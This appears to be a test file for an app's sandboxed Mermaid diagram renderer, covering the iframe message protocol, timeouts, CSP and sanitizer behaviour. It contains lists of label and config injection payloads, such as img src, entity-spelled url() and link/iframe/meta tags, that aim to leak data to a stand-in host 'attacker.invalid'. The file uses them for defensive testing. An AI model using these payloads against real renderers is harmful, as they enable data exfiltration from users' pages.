import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { setupDom } from "@agenteschat/ui/testing/dom";

setupDom();

import { readFileSync } from "node:fs";
import { join } from "node:path";
import { act, cleanup, fireEvent, render, within } from "@testing-library/react";
import { MermaidDiagram, setMermaidRenderer } from "@/components/artifacts/Mermaid";
import { ArtifactContentView } from "@/components/artifacts/views";
import { createI18n } from "@/i18n";
import { Markdown } from "@/lib/markdown";
import {
  drawWithMermaid,
  type MermaidFrame,
  mermaidDrawable,
  mermaidFrameDocument,
  mermaidRunsApart,
  setMermaidFrame,
  svgDrawing,
} from "@/lib/mermaid";
import { settle } from "./render";

const fence = (source: string) => `\`\`\`mermaid\n${source}\n\`\`\``;
const FLOW = "flowchart LR\n  A[Pedido] --> B[Deploy]";
const SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="100%" viewBox="0 0 200 80"><title>Fluxo</title></svg>';
const tick = () => new Promise<void>((resolve) => setTimeout(resolve, 0));

type Request = { id: string; source: string; dark: boolean };
/**
 * A stand-in for a frame the page made: the scripts it'd run, what the page posted to it, its load, whether it was
 * thrown away.
 */
type FakeFrame = { scripts: string[]; win: Window; posted: unknown[]; load: () => void; removed: boolean };
/** The frames the page made, oldest first. */
const frames: FakeFrame[] = [];
function fakeFrame(scripts: string[]): MermaidFrame {
  const posted: unknown[] = [];
  let load = () => {};
  const loaded = new Promise<void>((resolve) => {
    load = resolve;
  });
  const made: FakeFrame = {
    scripts,
    win: { postMessage: (m: unknown) => posted.push(m) } as unknown as Window,
    posted,
    load,
    removed: false,
  };
  frames.push(made);
  return {
    window: () => (made.removed ? null : made.win),
    loaded,
    remove: () => {
      made.removed = true;
    },
  };
}
/** A message to the page, as posted by `from`: the frame's window, or any other. */
const post = (from: unknown, data: unknown) =>
  window.dispatchEvent(new MessageEvent("message", { source: from as MessageEventSource, data }));
/** The page's frame, loaded and ready, the way mermaid-frame.js says it is. */
async function readyFrame(index = 0) {
  const made = frames[index] as FakeFrame;
  made.load();
  await tick();
  post(made.win, { ready: true });
  await tick();
  return made;
}
/**
 * The last frame made, the one without mermaid that `mermaidRunsApart` asks, answering as a frame does when it runs
 * `apart` from the page: it read the question while the page kept busy (from 5 ms after asking, for 60 ms). On the
 * page's thread it reads it only after.
 */
async function answerProbe(apart: boolean) {
  const probe = await readyFrame(frames.length - 1);
  await tick();
  expect(probe.posted).toEqual([{ probe: true }]);
  const asked = Date.now();
  await new Promise((resolve) => setTimeout(resolve, 100));
  // In act(): blocks waiting on the answer show it.
  await act(async () => {
    post(probe.win, { at: apart ? asked + 35 : Date.now() });
    await tick();
  });
  return probe;
}

beforeAll(() => createI18n("pt-BR"));
afterAll(() => {
  setMermaidFrame(null);
  setMermaidRenderer(null);
});
beforeEach(() => {
  frames.length = 0;
  setMermaidFrame(fakeFrame);
  // The real renderer, with nothing drawn yet.
  setMermaidRenderer(null);
});
afterEach(() => cleanup());

describe("the frame mermaid draws in", () => {
  test("a drawing is sent once the frame has loaded and said it's ready, and comes back as its SVG", async () => {
    const drawing = drawWithMermaid("d1", FLOW, true);
    const made = frames[0] as FakeFrame;
    made.load();
    await tick();
    expect(made.posted).toEqual([]);
    post(made.win, { ready: true });
    await tick();
    expect(made.posted).toEqual([{ id: "d1", source: FLOW, dark: true }]);
    post(made.win, { id: "d1", svg: SVG });
    expect(await drawing).toBe(SVG);
  });

  test("one mermaid can't draw fails with mermaid's error, and the frame is kept for the next", async () => {
    const drawing = drawWithMermaid("bad", "sequenceDiagram\n  Ana-->>", false);
    const made = await readyFrame();
    post(made.win, { id: "bad", error: "Error: Parse error on line 2" });
    await expect(drawing).rejects.toThrow("Parse error on line 2");
    const next = drawWithMermaid("good", FLOW, false);
    await tick();
    expect(frames).toHaveLength(1);
    expect(made.posted.at(-1)).toEqual({ id: "good", source: FLOW, dark: false });
    post(made.win, { id: "good", svg: SVG });
    expect(await next).toBe(SVG);
  });

  test("only the frame's own window is heard, and only in the protocol's shape", async () => {
    // Another frame on the page, like an agent's HTML page.
    const other = { postMessage() {} };
    const drawing = drawWithMermaid("d2", FLOW, false);
    const made = frames[0] as FakeFrame;
    post(other, { ready: true });
    made.load();
    await tick();
    expect(made.posted).toEqual([]);
    post(made.win, { ready: true });
    await tick();
    expect(made.posted).toHaveLength(1);
    const fake = '<svg xmlns="http://www.w3.org/2000/svg"><text>fake</text></svg>';
    for (const [from, data] of [
      [other, { id: "d2", svg: fake }],
      [window, { id: "d2", svg: fake }],
      [null, { id: "d2", svg: fake }],
      [made.win, { id: "d2", svg: 1 }],
      [made.win, { id: 2, svg: fake }],
      [made.win, { id: "d3", svg: fake }],
      [made.win, [{ id: "d2", svg: fake }]],
      [made.win, fake],
      [made.win, null],
    ])
      post(from, data);
    post(made.win, { id: "d2", svg: SVG });
    expect(await drawing).toBe(SVG);
  });

  test("a message from another frame while the frame is still being made is dropped, not an error", async () => {
    // Until the outer frame has parsed the inner one, reading the inner one's window throws (Chromium).
    const proto = HTMLIFrameElement.prototype;
    const own = Object.getOwnPropertyDescriptor(proto, "contentWindow");
    const blocked = new Proxy(
      {},
      {
        get() {
          throw new DOMException(
            'Blocked a frame with origin "null" from accessing a cross-origin frame.',
            "SecurityError",
          );
        },
      },
    );
    Object.defineProperty(proto, "contentWindow", { configurable: true, get: () => blocked });
    const errors: unknown[] = [];
    const report = (event: ErrorEvent) => errors.push(event.error);
    window.addEventListener("error", report);
    try {
      // The real frame (happy-dom runs none of its scripts).
      setMermaidFrame(null);
      const drawing = drawWithMermaid("early", FLOW, false, 30);
      post({ postMessage() {} }, { ready: true });
      await expect(drawing).rejects.toThrow("didn't finish");
      expect(errors).toEqual([]);
    } finally {
      window.removeEventListener("error", report);
      if (own) Object.defineProperty(proto, "contentWindow", own);
      setMermaidFrame(fakeFrame);
    }
  });

  test("a frame that doesn't answer in time is thrown away, and the next drawing gets a fresh one", async () => {
    const stuck = drawWithMermaid("stuck", FLOW, false, 30);
    // Watched before anything else is awaited: on a busy machine the 30 ms end before the frame is ready, and a
    // rejection nobody watches yet fails the test as an unhandled error. A plain handler, not `expect().rejects`:
    // that one waits for the promise where it is written, and this one settles only once the frame below loads.
    const failed = stuck.then(
      () => null,
      (error: Error) => error,
    );
    const first = await readyFrame();
    expect((await failed)?.message).toContain("didn't finish");
    expect(first.removed).toBe(true);
    const next = drawWithMermaid("next", FLOW, false, 1000);
    expect(frames).toHaveLength(2);
    const second = await readyFrame(1);
    expect(second.posted).toEqual([{ id: "next", source: FLOW, dark: false }]);
    // The block that timed out may try again: it goes to the fresh frame too.
    const again = drawWithMermaid("stuck-again", FLOW, false, 1000);
    await tick();
    post(second.win, { id: "next", svg: SVG });
    post(second.win, { id: "stuck-again", svg: SVG });
    expect([await next, await again]).toEqual([SVG, SVG]);
  });

  test("the time allowed counts from the frame's load, however slow mermaid's bundle is to arrive", async () => {
    // Twice the time allowed passes before the load; after it, a busy CI runner still answers well within it.
    const drawing = drawWithMermaid("slow", FLOW, false, 250);
    await new Promise((resolve) => setTimeout(resolve, 500));
    const made = await readyFrame();
    expect(made.removed).toBe(false);
    post(made.win, { id: "slow", svg: SVG });
    expect(await drawing).toBe(SVG);
  });

  test("a fence on the page is drawn in the frame; a page without one makes no frame", async () => {
    render(<Markdown source={"# Notas\n\n```ts\nconst a = 1;\n```"} />);
    await settle();
    expect(frames).toEqual([]);
    const el = render(<Markdown source={fence(FLOW)} />).container;
    await settle();
    await answerProbe(true);
    await settle();
    const made = await readyFrame(1);
    const [asked] = made.posted as Request[];
    expect(asked).toEqual({ id: expect.any(String), source: FLOW, dark: false });
    post(made.win, { id: asked?.id, svg: SVG });
    await settle();
    expect(el.querySelector(".code-card__preview img")?.getAttribute("alt")).toBe("Fluxo");
  });

  test("drawings start unasked where a frame runs apart from the page, as one without mermaid's bundle says", async () => {
    const asking = mermaidRunsApart();
    expect(frames.map((f) => f.scripts)).toEqual([["/assets/mermaid-frame.js"]]);
    // Only the frame's own window is heard: the question is asked once.
    post({ postMessage() {} }, { ready: true });
    const probe = await answerProbe(true);
    expect(await asking).toBe(true);
    expect(probe.removed).toBe(true);
    // Asked once a page load. The frame that draws runs mermaid's bundle.
    expect(await mermaidRunsApart()).toBe(true);
    void drawWithMermaid("d", FLOW, false);
    expect(frames.map((f) => f.scripts)).toEqual([
      ["/assets/mermaid-frame.js"],
      ["/assets/mermaid.min.js", "/assets/mermaid-frame.js"],
    ]);
  });

  test("a frame on the page's thread, whose answer arrives once it's done being busy, makes drawings wait", async () => {
    const asking = mermaidRunsApart();
    await answerProbe(false);
    expect(await asking).toBe(false);
  });

  test("a frame that doesn't answer makes drawings wait", async () => {
    setMermaidFrame(fakeFrame, 30);
    expect(await mermaidRunsApart()).toBe(false);
    expect(frames[0]?.removed).toBe(true);
  });

  test("once a drawing has timed out none starts unasked again, and the frame isn't asked again", async () => {
    const asking = mermaidRunsApart();
    await answerProbe(true);
    expect(await asking).toBe(true);
    const stuck = drawWithMermaid("stuck", FLOW, false, 30);
    await readyFrame(1);
    await expect(stuck).rejects.toThrow("didn't finish");
    expect(await mermaidRunsApart()).toBe(false);
    expect(frames).toHaveLength(2);
  });

  test("where the frame shares the page's thread a fence waits for Ver diagrama, and only that one is drawn", async () => {
    const other = "flowchart LR\n  C --> D";
    const el = render(<Markdown source={`${fence(FLOW)}\n\n${fence(other)}`} />).container;
    await settle();
    await answerProbe(false);
    await settle();
    const buttons = within(el).getAllByRole("button", { name: "Ver diagrama" });
    expect(buttons).toHaveLength(2);
    expect(Array.from(el.querySelectorAll(".code-card__code"), (code) => code.textContent)).toEqual([FLOW, other]);
    expect(frames).toHaveLength(1);
    await act(async () => fireEvent.click(buttons[0] as HTMLElement));
    await settle();
    const made = await readyFrame(1);
    const [asked] = made.posted as Request[];
    expect(asked?.source).toBe(FLOW);
    post(made.win, { id: asked?.id, svg: SVG });
    await settle();
    expect(el.querySelector(".code-card__preview img")?.getAttribute("alt")).toBe("Fluxo");
    expect(within(el).getAllByRole("button", { name: "Ver diagrama" })).toHaveLength(1);
    expect(within(el).getByRole("button", { name: "Código" })).toBeTruthy();
    expect(made.posted).toHaveLength(1);
  });

  test("there a diagram's thumbnail in Drive shows its code, and the diagram opened is drawn", async () => {
    const thumbnail = render(<MermaidDiagram source={FLOW} label="Diagrama: Fluxo" compact />).container;
    await settle();
    await answerProbe(false);
    await settle();
    expect(thumbnail.querySelector(".artifact-diagram--failed code")?.textContent).toBe(FLOW);
    expect(thumbnail.textContent).not.toContain("Não foi possível");
    const view = render(<MermaidDiagram source={FLOW} label="Diagrama: Fluxo" />);
    await settle();
    const made = await readyFrame(1);
    const [asked] = made.posted as Request[];
    post(made.win, { id: asked?.id, svg: SVG });
    await settle();
    expect(view.container.querySelector(".artifact-diagram img")?.getAttribute("alt")).toBe("Fluxo");
    // The same block made a thumbnail of another diagram waits again (once a source being edited would be drawn).
    view.rerender(<MermaidDiagram source={"flowchart LR\n  C --> D"} label="Diagrama: Fluxo" compact />);
    await act(() => new Promise((resolve) => setTimeout(resolve, 350)));
    await settle();
    expect(view.container.querySelector(".artifact-diagram--failed code")?.textContent).toBe("flowchart LR\n  C --> D");
    expect(made.posted).toHaveLength(1);
  });

  test("the Drive viewer waits for Ver diagrama where the frame shares the page's thread, like a Markdown fence", async () => {
    const el = render(<ArtifactContentView content={{ kind: "diagram", mermaid: FLOW }} title="Fluxo" />).container;
    await settle();
    await answerProbe(false);
    await settle();
    // The same card a ```mermaid fence gets: code, Ver diagrama and Copiar, nothing drawn, no drawing frame made.
    expect(within(el).getByRole("button", { name: "Ver diagrama" })).toBeTruthy();
    expect(within(el).getAllByRole("button", { name: "Copiar" }).length).toBeGreaterThan(0);
    expect(el.querySelector(".code-card__code")?.textContent).toBe(FLOW);
    expect(el.querySelector(".code-card__preview img")).toBeNull();
    expect(frames).toHaveLength(1);
    await act(async () => fireEvent.click(within(el).getByRole("button", { name: "Ver diagrama" })));
    await settle();
    const made = await readyFrame(1);
    const [asked] = made.posted as Request[];
    expect(asked?.source).toBe(FLOW);
    post(made.win, { id: asked?.id, svg: SVG });
    await settle();
    expect(el.querySelector(".code-card__preview img")?.getAttribute("alt")).toBe("Fluxo");
  });

  test("the Drive viewer draws by itself where the frame runs apart from the page", async () => {
    const el = render(<ArtifactContentView content={{ kind: "diagram", mermaid: FLOW }} title="Fluxo" />).container;
    await settle();
    await answerProbe(true);
    await settle();
    const made = await readyFrame(1);
    const [asked] = made.posted as Request[];
    expect(asked?.source).toBe(FLOW);
    post(made.win, { id: asked?.id, svg: SVG });
    await settle();
    expect(el.querySelector(".code-card__preview img")?.getAttribute("alt")).toBe("Fluxo");
    expect(within(el).queryByRole("button", { name: "Ver diagrama" })).toBeNull();
  });

  test("after a drawing times out, the fences waiting behind it wait for the viewer, not for fresh frames", async () => {
    setMermaidFrame(fakeFrame, 200);
    const sources = [FLOW, "flowchart LR\n  C --> D", "flowchart LR\n  E --> F"];
    const el = render(<Markdown source={sources.map(fence).join("\n\n")} />).container;
    await tick();
    await tick();
    await answerProbe(true);
    await settle();
    // The first one's frame never answers.
    await readyFrame(1);
    await act(() => new Promise((resolve) => setTimeout(resolve, 250)));
    await settle();
    expect(frames).toHaveLength(2);
    expect(Array.from(el.querySelectorAll(".code-card__code"), (code) => code.textContent)).toEqual(sources);
    expect(within(el).getAllByRole("button", { name: "Ver diagrama" })).toHaveLength(2);
  });

  test("a diagram longer than the page sends mermaid stays code, in Drive too, and never reaches the frame", async () => {
    const long = `flowchart LR\n  A[${"x".repeat(50_000)}] --> B`;
    const el = render(<MermaidDiagram source={long} label="Diagrama: Fluxo" />).container;
    await settle();
    expect(el.querySelector(".artifact-diagram--failed code")?.textContent).toBe(long);
    expect(frames).toEqual([]);
  });

  test("both frames are sandboxed with scripts only, and load nothing but mermaid's bundle and mermaid-frame.js", () => {
    const scripts = [
      "https://agentes.example/assets/mermaid.min-a1.js",
      "https://agentes.example/assets/mermaid-frame-b2.js",
    ];
    const csp = `default-src 'none'; script-src ${scripts.join(" ")}; style-src 'unsafe-inline'; img-src data:`;
    const parse = (html: string) => new DOMParser().parseFromString(html, "text/html");
    const policy = (doc: Document) =>
      doc.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute("content");
    const outer = parse(mermaidFrameDocument(scripts));
    expect(policy(outer)).toBe(csp);
    expect(outer.querySelectorAll("script")).toHaveLength(0);
    const inner = outer.querySelector("iframe");
    expect(inner?.getAttribute("sandbox")).toBe("allow-scripts");
    const drawing = parse(inner?.getAttribute("srcdoc") ?? "");
    expect(policy(drawing)).toBe(csp);
    expect(Array.from(drawing.querySelectorAll("script"), (s) => s.getAttribute("src"))).toEqual(scripts);
  });

  test("an SVG over 1 MB or 20,000 px on a side, or one an <img> can't read, isn't shown: its fence stays code", () => {
    const svg = (viewBox: string, body = "") =>
      `<svg xmlns="http://www.w3.org/2000/svg" width="100%" viewBox="${viewBox}">${body}</svg>`;
    expect(svgDrawing(svg("0 0 200 80"))?.width).toBe(200);
    expect(svgDrawing(svg("0 -25 20000 20000"))?.width).toBe(20_000);
    // A packet of 10,000 rows (3.9 MB) stalled Chrome 0.5 s; spacings of 10,000,000 made a card 12,000,000 px tall.
    expect(svgDrawing(svg("0 0 200 80", `<text>${"x".repeat(1_000_000)}</text>`))).toBeNull();
    expect(svgDrawing(svg("0 0 20001 80"))).toBeNull();
    expect(svgDrawing(svg("0 0 6000094 12000097"))).toBeNull();
    expect(svgDrawing('<svg xmlns="http://www.w3.org/2000/svg"><g></svg>')).toBeNull();
    expect(svgDrawing("<p>oi</p>")).toBeNull();
  });
});

/*
 * mermaid-frame.js with the real mermaid 11.17.2, drawing in this test's page instead of the frame. Nothing reaches
 * the network here: every place where markup turns into a load is recorded instead (`new Image().src`, URL and style
 * attributes, HTML handed to the parser, <style> text, style properties), and the outside host is reserved (.invalid).
 */

const HOST = "attacker.invalid";
const LEAK = `https://${HOST}/p.png?leak=SECRET`;
/** What the page was asked to load from the outside host: the requests a browser would have made. */
const requested: string[] = [];
const note = (where: string, value: unknown) => {
  if (String(value).includes(HOST)) requested.push(`${where}: ${value}`);
};

/** `new Image()` the way mermaid's image nodes use it. */
class RecordingImage {
  naturalWidth = 10;
  naturalHeight = 10;
  #src = "";
  get src() {
    return this.#src;
  }
  set src(value: string) {
    note("new Image().src", value);
    this.#src = value;
  }
  decode() {
    return Promise.resolve();
  }
}

/** The real mermaid, loaded once the DOM is attached: its sanitizer takes the window it finds when it loads. */
let mermaid: typeof import("mermaid")["default"];
const restore: (() => void)[] = [];
function patch(target: object, key: string, descriptor: PropertyDescriptor) {
  const before = Object.getOwnPropertyDescriptor(target, key);
  Object.defineProperty(target, key, { configurable: true, enumerable: before?.enumerable, ...descriptor });
  restore.push(() => (before ? Object.defineProperty(target, key, before) : Reflect.deleteProperty(target, key)));
}

/** mermaid-frame.js run here: what it answered, and a way to post to it as `from` (by default, the page it answers). */
function frameScript() {
  const answers: unknown[] = [];
  const page = { postMessage: (message: unknown) => answers.push(message) };
  let listener = async (_event: { source: unknown; data: unknown }) => {};
  const code = readFileSync(join(import.meta.dir, "../src/lib/mermaid-frame.js"), "utf8");
  // Its globals in the frame: the window above the outer frame is the page, and mermaid's bundle defines `mermaid`.
  new Function("parent", "addEventListener", "mermaid", code)(
    { parent: page },
    (_type: string, added: typeof listener) => {
      listener = added;
    },
    mermaid,
  );
  const ask = async (data: unknown, from: unknown = page) => {
    const before = answers.length;
    await listener({ source: from, data });
    return answers.length > before ? answers.at(-1) : undefined;
  };
  return { answers, ask };
}

/**
 * Label HTML that mermaid puts in the document, spelled the ways a tag check misses. Its sanitizer, as
 * mermaid-frame.js sets it, drops what would load.
 */
const LABEL_HTML: [string, string][] = [
  [
    "a sequence message with math, the first attribute with no value",
    `sequenceDiagram\n  A->>B: $$x$$ <img alt src=${LEAK}>`,
  ],
  ["a sequence message with math, slashes between attributes", `sequenceDiagram\n  A->>B: $$x$$ <img/alt/src=${LEAK}>`],
  ["a sequence message with math, an attribute named =x", `sequenceDiagram\n  A->>B: $$x$$ <img =x src=${LEAK}>`],
  ["a sequence note with math", `sequenceDiagram\n  participant A\n  Note over A: $$x$$ <img alt src=${LEAK}>`],
  ["a participant's alias with math", `sequenceDiagram\n  participant A as $$x$$ <img alt src=${LEAK}>\n  A->>A: oi`],
  ["a class label with math", `classDiagram\n  class A["$$x$$ <img alt src=${LEAK}>"]`],
  [
    "a class label's style attribute, url( spelled with an entity",
    `classDiagram\n  class A["$$x$$ <b alt style=background-image:ur#108;(${LEAK})>b</b>;"]`,
  ],
  [
    "an inline SVG's mask in a class label",
    `classDiagram\n  class A["$$x$$ <svg><rect x mask=ur#108;(${LEAK}#m) /></svg>"]`,
  ],
  ["an architecture service's text", `architecture-beta\n  service s1 "<img alt src=${LEAK}>"[S1]`],
  ["an architecture service's text, a backslash after <", `architecture-beta\n  service s1 "<\\img src=${LEAK}>"[S1]`],
  // An <a href> loads nothing on its own, but Firefox resolves its host; the config drops the href, as it does src.
  ["a link in a sequence message with math", `sequenceDiagram\n  A->>B: $$x$$ <a href=${LEAK}>a</a>`],
];
/**
 * Tags the frames' CSP does not stop in every engine (measured, see mermaid.ts): a preconnect or prerender link and an
 * iframe. mermaid strict and the DOMPurify config drop them before they reach the document, so no fence loads them, even
 * though allowing the tag shows the label's HTML does reach the document with the URL in it. (A meta refresh has its own
 * test: DOMPurify neutralizes it even when allowed, so there's no variant that loads.)
 */
const LABEL_HTML_CSP: [string, string][] = [
  ["a preconnect link", `sequenceDiagram\n  A->>B: $$x$$ <link rel=preconnect href=${LEAK}>`],
  [
    "a prerender link (Chromium sends it as a GET)",
    `sequenceDiagram\n  A->>B: $$x$$ <link rel=prerender href=${LEAK}>`,
  ],
  ["an iframe", `sequenceDiagram\n  A->>B: $$x$$ <iframe src=${LEAK}>`],
];
/** A diagram's own settings that would reach the document's CSS. */
const SETTINGS = [
  `%%{init: {"themeCSS": ".node rect { mask-image: url(${LEAK}) }"}}%%\nflowchart LR\n  A --> B`,
  `%%{initialize: {"fontFamily": "x; mask-image: url(${LEAK})"}}%%\nflowchart LR\n  A --> B`,
  `---\nconfig:\n  themeCSS: ".node rect { mask-image: url(${LEAK}) }"\n---\nflowchart LR\n  A --> B`,
  `---\n"\\x63onfig": {fontFamily: "x; mask-image: url(${LEAK})"}\n---\nflowchart LR\n  A --> B`,
];

/**
 * Mermaid with its own sanitizer settings instead of mermaid-frame.js's; what it leaves in <body> is then removed.
 * `dompurifyConfig` lets a case allow the tags mermaid's default list drops anyway (link, meta, iframe), to show the
 * label's HTML does reach the document with the URL in it — so the frame's config, not mermaid, is what stops it.
 */
async function drawRaw(id: string, source: string, dompurifyConfig?: object) {
  const before = new Set(document.body.children);
  mermaid.initialize({
    startOnLoad: false,
    htmlLabels: false,
    flowchart: { htmlLabels: false },
    suppressErrorRendering: true,
    ...(dompurifyConfig ? { dompurifyConfig } : {}),
  });
  await mermaid.mermaidAPI.render(id, source).catch(() => {});
  // It draws a participant's label without waiting for it.
  await settle();
  for (const el of Array.from(document.body.children)) if (!before.has(el)) el.remove();
}

describe("inside the frame, mermaid-frame.js", () => {
  beforeAll(async () => {
    mermaid = (await import("mermaid")).default;
    // What a browser has and happy-dom lacks, so mermaid takes the paths it takes there: MathML (without it each
    // `$$…$$` becomes the text "MathML is unsupported") and text with a box (without one every label fails its
    // measuring). Blank text has none, as in Chromium.
    patch(window, "MathMLElement", { value: class {}, writable: true });
    patch(SVGGraphicsElement.prototype, "getBBox", {
      value(this: SVGGraphicsElement) {
        const text = this.textContent?.trim() ?? "";
        return new DOMRect(0, 0, text.length * 8, text ? 16 : 0);
      },
    });
    const inPage = (node: Node) => node.ownerDocument === document;
    const loads = (name: string) =>
      /^(?:src|srcset|href|background|poster|data|style)$/i.test(name.replace(/^.*:/, ""));
    patch(globalThis, "Image", { value: RecordingImage, writable: true });
    const { setAttribute, setAttributeNS, insertAdjacentHTML } = Element.prototype;
    patch(Element.prototype, "setAttribute", {
      value(this: Element, name: string, value: string) {
        if (inPage(this) && loads(name)) note(`<${this.localName} ${name}>`, value);
        setAttribute.call(this, name, value);
      },
    });
    patch(Element.prototype, "setAttributeNS", {
      value(this: Element, ns: string | null, name: string, value: string) {
        if (inPage(this) && loads(name)) note(`<${this.localName} ${name}>`, value);
        setAttributeNS.call(this, ns, name, value);
      },
    });
    patch(Element.prototype, "insertAdjacentHTML", {
      value(this: Element, where: InsertPosition, html: string) {
        if (inPage(this)) note(`<${this.localName}> HTML`, html);
        insertAdjacentHTML.call(this, where, html);
      },
    });
    for (const proto of [Node.prototype, Element.prototype, HTMLElement.prototype, SVGElement.prototype])
      for (const key of ["innerHTML", "outerHTML", "textContent"]) {
        const own = Object.getOwnPropertyDescriptor(proto, key);
        if (!own?.set) continue;
        patch(proto, key, {
          get: own.get,
          set(this: Node, value: string) {
            if (inPage(this) && (key !== "textContent" || this.nodeName === "STYLE"))
              note(`<${this.nodeName.toLowerCase()}> ${key === "textContent" ? "text" : "HTML"}`, value);
            own.set?.call(this, value);
          },
        });
      }
    const { setProperty } = CSSStyleDeclaration.prototype;
    patch(CSSStyleDeclaration.prototype, "setProperty", {
      value(this: CSSStyleDeclaration, name: string, value: string, priority?: string) {
        note(`style ${name}`, value);
        setProperty.call(this, name, value, priority);
      },
    });
  });
  afterAll(() => {
    for (const undo of restore.reverse()) undo();
  });
  beforeEach(() => {
    requested.length = 0;
  });

  test("it answers the page that made it and no one else, each drawing as its SVG or mermaid's error", async () => {
    const frame = frameScript();
    expect(frame.answers).toEqual([{ ready: true }]);
    expect(await frame.ask({ id: "a", source: FLOW, dark: false }, { postMessage() {} })).toBeUndefined();
    for (const data of [{ id: 1, source: FLOW }, { id: "a", source: 1 }, FLOW, null])
      expect(await frame.ask(data)).toBeUndefined();
    const drawn = (await frame.ask({ id: "a", source: FLOW, dark: false })) as { id: string; svg: string };
    expect(drawn.id).toBe("a");
    expect(drawn.svg).toStartWith('<svg id="mmd-');
    expect(await frame.ask({ id: "b", source: "sequenceDiagram\n  Ana-->>", dark: true })).toEqual({
      id: "b",
      error: expect.stringContaining("Parse error"),
    });
  });

  test("asked by the page whether it runs apart, it answers when it read the question, 25 ms on", async () => {
    const frame = frameScript();
    expect(await frame.ask({ probe: true }, { postMessage() {} })).toBeUndefined();
    const before = Date.now();
    const answer = (await frame.ask({ probe: true })) as { at: number };
    expect(answer.at - before).toBeGreaterThanOrEqual(25);
    expect(answer.at).toBeLessThanOrEqual(Date.now());
  });

  test("a diagram's own settings change how it looks, never its sizes, spacings or widths", async () => {
    const own = {
      theme: "forest",
      look: "handDrawn",
      fontSize: 400,
      flowchart: { curve: "step", nodeSpacing: 10_000_000, rankSpacing: 10_000_000, wrappingWidth: 1 },
      sequence: { mirrorActors: false, width: 1 },
      packet: { bitsPerRow: 1 },
      mindmap: { maxNodeWidth: 1 },
      gantt: { useWidth: 100_000 },
    };
    const defaults = mermaid.mermaidAPI.defaultConfig;
    for (const source of [
      `%%{init: ${JSON.stringify(own)}}%%\nflowchart LR\n  A --> B`,
      `---\nconfig: ${JSON.stringify(own)}\n---\nflowchart LR\n  A --> B`,
    ]) {
      await frameScript().ask({ id: "own", source, dark: false });
      const config = mermaid.mermaidAPI.getConfig();
      expect([config.look, config.flowchart?.curve, config.sequence?.mirrorActors]).toEqual([
        "handDrawn",
        "step",
        false,
      ]);
      expect([config.theme, config.fontSize, config.gantt?.useWidth]).toEqual(["neutral", defaults.fontSize, 720]);
      expect([config.flowchart?.nodeSpacing, config.flowchart?.rankSpacing, config.flowchart?.wrappingWidth]).toEqual([
        defaults.flowchart?.nodeSpacing,
        defaults.flowchart?.rankSpacing,
        defaults.flowchart?.wrappingWidth,
      ]);
      expect([config.sequence?.width, config.packet?.bitsPerRow, config.mindmap?.maxNodeWidth]).toEqual([
        defaults.sequence?.width,
        defaults.packet?.bitsPerRow,
        defaults.mindmap?.maxNodeWidth,
      ]);
    }
    // Mermaid copies the list on every read of its settings, in time that grows with its square: 709 names (every one
    // it knows) drew the largest diagrams 2 to 2.5 times as slowly.
    expect(mermaid.mermaidAPI.getSiteConfig().secure?.length).toBeLessThan(120);
  });

  test("a journey drawn is markup an <img> reads: its own size takes the place of the height mermaid gave it", async () => {
    const journey = "journey\n  title Onboarding\n  section Conta\n    Criar: 5: Ana";
    const drawn = (await frameScript().ask({ id: "j", source: journey, dark: false })) as { svg: string };
    expect(drawn.svg).toMatch(/^<svg [^>]*\bheight="/);
    const src = svgDrawing(drawn.svg)?.src ?? "";
    const root = decodeURIComponent(src.slice(src.indexOf(",") + 1)).match(/^<svg [^>]*>/)?.[0] ?? "";
    const names = Array.from(root.matchAll(/\s([\w:-]+)=/g), ([, name]) => name);
    expect(names).toContain("height");
    expect(names).toEqual([...new Set(names)]);
  });

  let labels = 0;
  test.each(LABEL_HTML)("%s: its HTML goes into the document without anything that loads", async (_, source) => {
    const frame = frameScript();
    // Under happy-dom an architecture diagram fails at its layout (no canvas), after its services are drawn. What a
    // participant's label puts in the document after the drawing is done counts too.
    await frame.ask({ id: "label", source, dark: false });
    await settle();
    expect(requested).toEqual([]);
    // With mermaid's own sanitizer settings the document asks for the URL: this label's HTML does reach it.
    await drawRaw(`raw-${++labels}`, source);
    expect(requested).not.toEqual([]);
  });

  test.each(LABEL_HTML_CSP)(
    "%s, which the CSP wouldn't stop, is dropped by the DOMPurify config",
    async (_, source) => {
      const frame = frameScript();
      await frame.ask({ id: "csp", source, dark: false });
      await settle();
      expect(requested).toEqual([]);
      // Allowing the tag shows the label's HTML reaches the document with the URL in it: the config is what stops it.
      await drawRaw(`csp-${++labels}`, source, { ADD_TAGS: ["link", "iframe"], ADD_ATTR: ["rel", "href", "src"] });
      expect(requested).not.toEqual([]);
    },
  );

  test("a meta refresh in a label, which the CSP wouldn't stop, is dropped: the diagram draws and loads nothing", async () => {
    // A class label keeps its quotes, where a sequence message's break the parse. DOMPurify neutralizes a meta refresh
    // itself (it stays dropped even when the tag is allowed), so the pin is that the diagram still drew and loaded nothing.
    const frame = frameScript();
    const drawn = await frame.ask({
      id: "meta",
      source: `classDiagram\n  class A["$$x$$ <meta http-equiv=refresh content=0;url=${LEAK}>"]`,
      dark: false,
    });
    await settle();
    expect(drawn).toHaveProperty("svg");
    expect(requested).toEqual([]);
  });

  test("a diagram's own settings that would reach CSS are dropped", async () => {
    const frame = frameScript();
    for (const source of SETTINGS) expect(await frame.ask({ id: "s", source, dark: false })).toHaveProperty("svg");
    expect(requested).toEqual([]);
  });

  test("what its settings let through, an image node, a classDef's url() and an actor's icon, is the frame's CSP to stop", async () => {
    const frame = frameScript();
    await frame.ask({ id: "image", source: `flowchart TD\n  A@{ img: "${LEAK}" }`, dark: false });
    expect(requested).toContain(`new Image().src: ${LEAK}`);
    requested.length = 0;
    const classUrl = `stateDiagram-v2\n  [*] --> s1\n  classDef c fill:url(${LEAK})\n  class s1 c`;
    await frame.ask({ id: "css", source: classUrl, dark: false });
    expect(requested.some((r) => r.startsWith("<style> HTML") && r.includes(LEAK))).toBe(true);
    requested.length = 0;
    const icon = `sequenceDiagram\n  participant A\n  properties A: {"icon": "${LEAK}"}`;
    await frame.ask({ id: "icon", source: icon, dark: false });
    expect(requested).toContain(`<image href>: ${LEAK}`);
  });

  test("a drawing that fails takes everything mermaid left in its body with it", async () => {
    const frame = frameScript();
    // A blank line in a label has no box to measure: mermaid stops with its measuring <svg> still in <body>.
    const failed = await frame.ask({ id: "blank", source: "sequenceDiagram\n  A->>B: a<br> <br>b", dark: false });
    expect(failed).toEqual({ id: "blank", error: expect.stringContaining("not in render tree") });
    expect(document.body.children).toHaveLength(0);
  });

